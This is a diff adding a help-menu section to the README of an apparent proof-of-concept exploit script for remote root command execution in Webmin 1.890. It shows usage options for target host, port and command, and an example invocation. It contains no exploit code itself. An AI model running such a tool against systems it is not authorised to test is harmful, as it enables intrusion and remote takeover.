@@ -13,6 +13,23 @@ you need [pip3](https://help.dreamhost.com/hc/es/articles/115000699011-Usar-pip3
   - os
   - bs4
 
+## Help Menu
+
+```bash
+$ python3 Webmin_exploit.py --help
+usage: Webmin_exploit.py [-h] -host IP [-port Port] [-cmd Command]
+
+Webmin 1.890 expired Remote Root POC
+
+optional arguments:
+  -h, --help    show this help message and exit
+  -host IP      Host to attack
+  -port Port    Port of the host ~ 10000 is Default
+  -cmd Command  Command to execute ~ id is Default
+
+python3 Webmin_exploit.py -host target -port 10000 -cmd id
+```
+
 ## Usage
 
 ```bash
